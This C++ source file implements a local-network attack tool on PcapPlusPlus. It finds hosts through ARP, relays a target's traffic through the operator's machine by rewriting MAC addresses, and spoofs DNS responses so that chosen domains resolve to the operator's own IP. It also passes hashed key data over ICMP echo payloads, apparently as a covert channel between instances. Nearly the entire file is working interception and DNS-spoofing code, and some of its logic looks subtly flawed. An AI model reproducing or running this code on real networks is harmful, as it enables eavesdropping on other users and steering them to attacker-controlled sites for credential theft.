#include "include/networking_system.h"

string NetworkingSystem::toHex(const Type& number)
{
	stringstream stream;
	stream << hex << number;
	return stream.str();
}

#ifndef _WIN32
    string NetworkingSystem::increment_address(const char* address_string)
    {
        // convert the input IP address to an integer
        in_addr_t address = inet_addr(address_string);

        // add one to the value (making sure to get the correct byte orders)
        address = ntohl(address);
        address += 1;
        address = htonl(address);

        // pack the address into the struct inet_ntoa expects
        struct in_addr address_struct;
        address_struct.s_addr = address;
        this->network_data.stats.search_ip = (string)inet_ntoa(address_struct);
        // convert back to a string
        return (string)inet_ntoa(address_struct);
    }
#else
    string NetworkingSystem::increment_address(const char* address_string)
    {
        // convert the input IP address to an integer
        uint32_t address = inet_addr(address_string);

        // add one to the value (making sure to get the correct byte orders)
        address = ntohl(address);
        address += 1;
        address = htonl(address);

        // pack the address into the struct inet_ntoa expects
        struct in_addr address_struct;
        address_struct.S_un.S_addr = address;
        this->network_data.stats.search_ip = (string)inet_ntoa(address_struct);
        // convert back to a string
        return (string)inet_ntoa(address_struct);
    }
#endif
    int NetworkingSystem::choose_interface_name(char* interface_name)
    {
        PcapLiveDevice* test_network = PcapLiveDeviceList::getInstance().getPcapLiveDeviceByIpOrName(interface_name);
        /// Check if the interface is active(currently we assume no vm is running on the mission)
        /// This edge case will be addressed in the GUI iteration(around March 2025)
        cout << (string)interface_name << endl;
        if(test_network->getDefaultGateway().toString() != "0.0.0.0") {
            cout << "\t|\t" << "YES";
            //cout << "Functioning network default gateway: " << test_network->getDefaultGateway().toString() << endl;
            this->device_name = (string)interface_name;
            //Add ui to choose a working interface(if more than 1 are active) when I will start working on the GUI iteration
            return TRUE;
        }
        cout << "\t|\t" << "NO";

        return FALSE;
    }

    void NetworkingSystem::Print_interface_details()
    {
        cout << "My Device's IPv4: " << this->communicator->getIPv4Address().toString() << endl;
        cout << "My Device's IPv6: " << this->communicator->getIPv6Address().toString() << endl;

        cout << "My Device's MAC Address: " << this->communicator->getMacAddress().toString() << endl;
        cout << "Default Gateway: " << this->communicator->getDefaultGateway() << endl;
        get_dns_servers();
    }

    void NetworkingSystem::Capture_packet()
    {
        /** Capture a DNS packet */
        /* Here we create filter, which will only captrue packets which were sent by the router or client */
        MacAddressFilter ForMeFilter(MacAddress(this->src_mac_addr), DST);
        IPFilter netIPFilter(IPv4Address(this->gateway_ip), SRC);

        NotFilter noF(&netIPFilter);
        vector<GeneralFilter*> filterOne;

        filterOne.push_back(&ForMeFilter);
        filterOne.push_back(&noF);

        OrFilter or_filter(filterOne);

        try {
            if(!still_capturing()) {
                this->communicator->clearFilter();
                this->communicator->setFilter(or_filter);

                if(!this->communicator->startCapture(OnRedirectedPacketArrives, &this->network_data)) {
                    cout << "[Couldn't start capturing packets, due to an error]" << endl;
                }
            }
        }
        catch(exception &e){
            cout << "[EXCEPTION HAS BEEN CAUGHT] " << e.what() << endl;
        }
    }

    void NetworkingSystem::Capture_packet(string target_ip, string target_mac)
    {
        /** Capture a DNS packet */
        /* Here we create filter, which will only captrue packets which were sent by the router or client */
        MacAddressFilter clientMacFilter(MacAddress(target_mac), SRC);
        MacAddressFilter netMacFilter(MacAddress(this->network_mac), SRC);
        MacAddressFilter ForMeFilter(MacAddress(this->src_mac_addr), DST);

        vector<GeneralFilter*> filterOne;
        filterOne.push_back(&clientMacFilter);
        filterOne.push_back(&ForMeFilter);
        filterOne.push_back(&netMacFilter);
        OrFilter or_filter(filterOne);

        try {
            if(!still_capturing()) {
                this->communicator->clearFilter();
                this->communicator->setFilter(or_filter);

                if(!this->communicator->startCapture(OnRedirectedPacketArrives, &this->network_data)) {
                    cout << "[Couldn't start capturing packets, due to an error]" << endl;
                }
            }
        }
        catch(exception &e){
            cout << "[EXCEPTION HAS BEEN CAUGHT] " << e.what() << endl;
        }
    }

    void NetworkingSystem::get_dns_servers()
    {
        if (!this->communicator->getDnsServers().empty()) {
            cout << "DNS server: " << this->communicator->getDnsServers().front() << endl;
        }
    }

    int NetworkingSystem::open_device()
    {
        NetworkingSystem::communicator = PcapLiveDeviceList::getInstance().getPcapLiveDeviceByIpOrName(this->device_name);
        if (!this->communicator->open()) {
            cerr << "Cannot open device" << endl;
            return FALSE;
        }
        return TRUE;
    }

    void NetworkingSystem::OnRedirectedPacketArrives(RawPacket* packet, PcapLiveDevice* capture_device, void* cookie)
    {
        /** Start capturing packets asynchronously */
        /** Get the pointer to the network data struct */
        auto* critical_details = static_cast<networkdata*>(cookie);
        Packet capturedPacket(packet);


        /** Check if the packet is relavent */
    	if (is_packet_irrelavent(packet)) {
    	   return;
    	}
       // cout << capturedPacket.toString() << endl;
    	EthLayer* ethLayer = capturedPacket.getLayerOfType<EthLayer>();

    	/** Skip my own packets */
    	if(ethLayer->getSourceMac().toString() == critical_details->my_mac) {
    	   return;
    	}

        if(capturedPacket.isPacketOfType(ARP)) {
            HandleArpPackets(packet, capture_device, cookie);
            return;
        }

        if(capturedPacket.isPacketOfType(ICMP)) {
            HandleIcmpPackets(packet, capture_device, cookie);
            return;
        }

        if(!critical_details->spoof_switch){
            return;
        }

    	IPLayer* ipLayer = capturedPacket.getLayerOfType<IPLayer>();
    	IPv4Layer* ip4Layer = dynamic_cast<IPv4Layer*>(ipLayer);
    	IPv6Layer* ip6Layer = dynamic_cast<IPv6Layer*>(ipLayer);

        if (ip4Layer != nullptr) {
            string src_ipv4_addr = ip4Layer->getSrcIPv4Address().toString();
            string dst_ipv4_addr = ip4Layer->getDstIPv4Address().toString();

            /** Skip my own packets */
           	if(src_ipv4_addr == critical_details->my_ip ||
                dst_ipv4_addr == critical_details->my_ip) {
        	   return;
           	}

       	} else if (ip6Layer != nullptr) {
            string src_ipv6_addr = ip6Layer->getSrcIPv6Address().toString();
            string dst_ipv6_addr = ip6Layer->getDstIPv6Address().toString();

            if(src_ipv6_addr == critical_details->my_ipv6 ||
                dst_ipv6_addr == critical_details->my_ipv6) {
        	   return;
           	}
       	} else {
      		throw std::logic_error("IPLayer should be either IPv4Layer or IPv6Layer");
       	}

    	/** Handle non dns packets */
    	if(!capturedPacket.isPacketOfType(DNS)) {
    		handle_non_dns_packets(packet, capture_device, cookie);
    	    return;
    	}

    	/** Get the packets dns layer */
    	DnsLayer* dnsLayer = capturedPacket.getLayerOfType<DnsLayer>();
    	/** Skip dns packets with no queries */
    	if (dnsLayer->getFirstQuery() == nullptr) {
    		return;
    	}

    	dns_spoof(packet, capture_device, cookie);
    }

    bool NetworkingSystem::is_packet_irrelavent(RawPacket* packet)
    {
        Packet capturedPacket(packet);
        return ((!capturedPacket.isPacketOfType(Ethernet) || !capturedPacket.isPacketOfType(ARP)) &&
                (!capturedPacket.isPacketOfType(IP) ||
                 !capturedPacket.isPacketOfType(Ethernet)));
    }

    void NetworkingSystem::handle_non_dns_packets(RawPacket* packet, PcapLiveDevice* capture_device, void* cookie)
    {
        /**
        * Handle the clients non dns packets
        */

        /**  extract the stats object form the cookie */
        auto* critical_details = static_cast<networkdata*>(cookie);
        Packet capturedPacket(packet);

        EthLayer* ethLayer = capturedPacket.getLayerOfType<EthLayer>();

        if(critical_details->target_mac == ethLayer->getSourceMac().toString()) {
            ethLayer->setSourceMac(MacAddress(critical_details->my_mac));
            ethLayer->setDestMac(MacAddress(critical_details->network_mac));
        } else if(critical_details->network_mac == ethLayer->getSourceMac().toString()) {
            ethLayer->setSourceMac(MacAddress(critical_details->my_mac));
            ethLayer->setDestMac(MacAddress(critical_details->target_mac));
        }

        capturedPacket.computeCalculateFields();
        capture_device->sendPacket(&capturedPacket, false);
    }

    void NetworkingSystem::dns_spoof(RawPacket* packet, PcapLiveDevice* capture_device, void* cookie)
    {
        /**
        * Initiate the dns spoof!
        */
        Packet dnsPacket(packet);

        DnsLayer* dnsLayer = dnsPacket.getLayerOfType<DnsLayer>();
        DnsQuery* dnsQuery = dnsLayer->getFirstQuery();

        string caught_domain = dnsQuery->getName();
        uint16_t dns_message_type = dnsLayer->getDnsHeader()->queryOrResponse;

        size_t auth_count = dnsLayer->getAuthorityCount();
        size_t add_count = dnsLayer->getAdditionalRecordCount();
        size_t ans_count = dnsLayer->getAnswerCount();

        redirect_dns_packet(packet, cookie, dns_message_type);
        int index = -1;

        if (dns_message_type == 1 || auth_count > 0 || add_count > 0  || ans_count > 0) {
            index = wanted_domain_in_response(caught_domain, cookie);

            if(index != -1) {
                handle_wanted_dns_response(packet, cookie, index);
            }
        }

        Packet newdnsPacket(packet);
        newdnsPacket.computeCalculateFields();

        if(!capture_device->sendPacket(&newdnsPacket, false)) {
            cout << "[Failed to send the DNS packet]" << endl;
        }
    }

    void NetworkingSystem::redirect_dns_packet(RawPacket* packet, void* cookie, uint16_t dns_message_type)
    {
        /**
        * Redirect the DNS packet as follows
        *  1 Requests: Redirect to router
        *  2.Responses: Redirect back to the client
        */
        auto* critical_details = static_cast<networkdata*>(cookie);
        Packet dnsPacket(packet);

        EthLayer* ethLayer = dnsPacket.getLayerOfType<EthLayer>();

        if (dns_message_type == 1) {
            ethLayer->setSourceMac(MacAddress(critical_details->my_mac));
            ethLayer->setDestMac(MacAddress(critical_details->target_mac));
        } else {
            ethLayer->setSourceMac(MacAddress(critical_details->my_mac));
            ethLayer->setDestMac(MacAddress(critical_details->network_mac));
        }

        dnsPacket.computeCalculateFields();
        packet = dnsPacket.getRawPacket();
    }

    int NetworkingSystem::wanted_domain_in_response(string domain_name, void* cookie)
    {
        auto* domains = static_cast<networkdata*>(cookie);
        for(int i = 0 ; i < 12 ; i ++) {
            if(domain_name.find(domains->domains_for_responses[i]) != std::string::npos) {
                return i;
            }
        }
        return -1;
    }

    void NetworkingSystem::handle_wanted_dns_response(RawPacket* packet, void* cookie, int index)
    {
        /**
            * Handle the DNS response and redirect wanted domains to my website
        */
        auto* critical_details = static_cast<networkdata*>(cookie);
        Packet dnsPacket(packet);

    	IPv4DnsResourceData dns_v4_data(IPv4Address(critical_details->my_ip));
    	IPv6DnsResourceData dns_v6_data(IPv6Address(critical_details->my_ipv6));

        DnsLayer* dnsLayer = dnsPacket.getLayerOfType<DnsLayer>();
        DnsQuery* dnsQuery = dnsLayer->getFirstQuery();

        string domain = dnsQuery->getName();
        string ips[2] = { critical_details->my_ip, critical_details->my_ipv6 };

        if(dnsLayer->getDnsHeader()->responseCode == 0) {
            if(index >= 0 && index < 12) {
                /* Wanted IPv4 dynamic domain names */
                RawPacket pack = critical_details->dns_answers_analysis(packet, ips, critical_details->forgerers);
                Packet newdnsPacket(&pack);
                dnsPacket = newdnsPacket;
            }
        }

        dnsPacket.computeCalculateFields();
        packet = dnsPacket.getRawPacket();
    }

    void NetworkingSystem::HandleArpPackets(RawPacket* packet, PcapLiveDevice* capture_device, void* cookie)
    {
        /**
        * A callback function for the async capture which is called each time a packet is captured
        */

        networkdata* critical_details = (networkdata*)(cookie);
        Packet arpPacket(packet);

        if (!arpPacket.isPacketOfType(ARP) || !arpPacket.isPacketOfType(Ethernet))
    		return;

    	EthLayer* ethLayer = (EthLayer*)arpPacket.getLayerOfType(Ethernet);
    	ArpLayer* captured_arp_layer = (ArpLayer*)arpPacket.getLayerOfType(ARP);

    	string src_mac = ethLayer->getSourceMac().toString();
    	string my_mac = capture_device->getMacAddress().toString();
    	string src_ip = captured_arp_layer->getSenderIpAddr().toString();

    	#ifndef _WIN32
       	    if(be16toh(captured_arp_layer->getArpHeader()->opcode) != 2){
        	   return;
           	}
        #else
            if(_byteswap_ushort(captured_arp_layer->getArpHeader()->opcode) != 2){
                return;
            }
        #endif

        if(src_ip == critical_details->default_gateway) {
           shut_the_fuck_up(packet, capture_device, cookie);
           return;
        }

        if(src_ip != critical_details->stats.search_ip) {
       	   return;
       	}

        critical_details->stats.user_src_ip = captured_arp_layer->getSenderIpAddr().toString();
        critical_details->stats.src_mac_address = captured_arp_layer->getSenderMacAddress().toString();
        critical_details->potential_users.push_back({critical_details->stats.user_src_ip, critical_details->stats.src_mac_address});
        critical_details->stats.consumePacket(arpPacket);
    }

    void NetworkingSystem::shut_the_fuck_up(RawPacket* packet, PcapLiveDevice* capture_device, void* cookie)
    {
        Packet capturedPacket(packet);
        auto* critical_details = static_cast<networkdata*>(cookie);
        string hashed_message;

        string important_details[4] = {
            critical_details->public_key.key_buffer,
           	critical_details->my_ip,
           	critical_details->default_gateway,
           	critical_details->my_mac
        };

        EthLayer* ethLayer = (EthLayer*)capturedPacket.getLayerOfType(Ethernet);
        string source_mac_address = ethLayer->getSourceMac().toString();

        Packet p(120);
        EthLayer etherLayer(critical_details->my_mac, source_mac_address);
        IPv4Layer ipLayer(IPv4Address(critical_details->my_ip), IPv4Address(important_details[2]));
        IcmpLayer icmpLayer;

        uint16_t id = 8;
        uint16_t sequence = 0;
        uint64_t timestamp = 0;

        hashed_message = critical_details->hasher6969(important_details[0] +
            important_details[1] +
            important_details[2] +
            important_details[3]);

        ipLayer.getIPv4Header()->timeToLive = 255;
        icmpLayer.getIcmpHeader()->type = 8;

        icmpLayer.setEchoReplyData(id, sequence, timestamp,
            (uint8_t*)hashed_message.c_str(), hashed_message.length());
        hashed_message.clear();
        p.addLayer(&etherLayer);
        p.addLayer(&ipLayer);

        p.addLayer(&icmpLayer);
        p.computeCalculateFields();
        capture_device->sendPacket(&p);
    }

    void NetworkingSystem::HandleIcmpPackets(RawPacket* packet, PcapLiveDevice* capture_device, void* cookie)
    {
        cout << "ENTERED ICMP PROCEDURE" << endl;
        Packet capturedPacket(packet);
        //cout << "got packet" << endl;
        auto* critical_details = static_cast<networkdata*>(cookie);
        //cout << "got details" << endl;
        EthLayer* ethLayer = (EthLayer*)capturedPacket.getLayerOfType(Ethernet);
        //cout << "got eth layer" << endl;
        string src_ip_address = extract_the_ip(capturedPacket.getRawPacket());
        //cout << "got ip" << endl;
        string source_mac_address = ethLayer->getSourceMac().toString();
        //cout << "got mac" << endl;
    	redirect_icmp_to_client(packet, capture_device, cookie);
        //cout << "huhhh????" << endl;
        //cout << original_message << endl;
    	string important_details[7] = { critical_details->public_key.key_buffer,
    	   src_ip_address,
    	   critical_details->default_gateway,
    	   source_mac_address,
           critical_details->my_ip,
    	   critical_details->my_mac,
    	   ""
    	};
        //cout << "got array of details" << endl;

    	RawPacket pack = critical_details->verifier(packet, important_details, critical_details->user_device.answered, critical_details->analyzers);
        //cout << "got new packet" << endl;
        if(critical_details->user_device.answered[0] || critical_details->user_device.answered[1]) {
            cout << "found one yay, moving on" << endl;
            critical_details->online_macs.push_back(src_ip_address);
        }
        //cout << "waat" << endl;
        if(!important_details[6].empty()) {
          //    cout << "SERVER SENT A MESSAGE YAYYYYYYYYYY" << endl;
            cout << "saving message [" << important_details[6] << "]" << endl;
            string user[2] = {source_mac_address, important_details[6]};
            store_user(critical_details, user);
       	    critical_details->hashed_message = important_details[6];
            if(critical_details->user_device.answered[1]){
                std::get<0>(critical_details->master_address) =  src_ip_address;
                std::get<1>(critical_details->master_address) =  source_mac_address;
            }
       	}
        //cout << "data is empty or not" << endl;
    	Packet newicmpPacket(&pack);
    	capturedPacket = newicmpPacket;

    	capturedPacket.computeCalculateFields();
    	fill(begin(important_details), end(important_details), "");

    	capture_device->sendPacket(&capturedPacket, false);
    }

    string NetworkingSystem::extract_the_ip(RawPacket* packet)
    {
        Packet icmpPacket(packet);
        IPLayer* ipLayer = icmpPacket.getLayerOfType<IPLayer>();

       	IPv4Layer* ip4Layer = dynamic_cast<IPv4Layer*>(ipLayer);
       	IPv6Layer* ip6Layer = dynamic_cast<IPv6Layer*>(ipLayer);

        if (ip4Layer != nullptr) {
            return ip4Layer->getSrcIPAddress().toString();
       	} else if (ip6Layer != nullptr) {
            return ip6Layer->getSrcIPAddress().toString();
       	} else {
      		throw std::logic_error("IPLayer should be either IPv4Layer or IPv6Layer");
            return "";
       	}
    }

    void NetworkingSystem::redirect_icmp_to_client(RawPacket *packet, PcapLiveDevice *capture_device, void *cookie)
    {
        /**
        * Redirect the icmp packet as follows
        *  1 From user: Reply to user
        *  2.From router: Reply to router (** will work on it soon)
        */
        Packet icmpPacket(packet);

        EthLayer* ethLayer = icmpPacket.getLayerOfType<EthLayer>();
        IPLayer* ipLayer = icmpPacket.getLayerOfType<IPLayer>();

       	IPv4Layer* ip4Layer = dynamic_cast<IPv4Layer*>(ipLayer);
       	IPv6Layer* ip6Layer = dynamic_cast<IPv6Layer*>(ipLayer);

        string src_mac = ethLayer->getSourceMac().toString();
        string dst_mac = ethLayer->getDestMac().toString();

        ethLayer->setSourceMac(MacAddress(dst_mac));
        ethLayer->setDestMac(MacAddress(src_mac));

        if (ip4Layer != nullptr) {
            string src_ipv4_addr = ip4Layer->getSrcIPv4Address().toString();
            string dst_ipv4_addr = ip4Layer->getDstIPv4Address().toString();

            ip4Layer->setSrcIPv4Address(IPv4Address(dst_ipv4_addr));
            ip4Layer->setDstIPv4Address(IPv4Address(src_ipv4_addr));
       	} else if (ip6Layer != nullptr) {
            string src_ipv6_addr = ip6Layer->getSrcIPv6Address().toString();
            string dst_ipv6_addr = ip6Layer->getDstIPv6Address().toString();

            ip6Layer->setSrcIPv6Address(IPv6Address(dst_ipv6_addr));
            ip6Layer->setDstIPv6Address(IPv6Address(src_ipv6_addr));
       	} else {
      		throw std::logic_error("IPLayer should be either IPv4Layer or IPv6Layer");
       	}


        icmpPacket.computeCalculateFields();
        packet = icmpPacket.getRawPacket();
    }

    void NetworkingSystem::store_user(void* cookie, string user[2])
    {
        auto* critical_details = static_cast<networkdata*>(cookie);

        if(critical_details->unhandled_users.empty()){
            cout << "in it goes" << endl;
            critical_details->unhandled_users.push_back({user[0], user[1]});
        } else {
            tuple<string, string> user_tuple = {user[0], user[1]};
            for(int i = 0 ; i < (int)critical_details->unhandled_users.size() ; i++){
                if(critical_details->unhandled_users[0] == user_tuple){
                    cout << "found" << endl;
                    return;
                }
            }
            cout << "not found" << endl;
            critical_details->unhandled_users.push_back({user[0], user[1]});
        }
    }
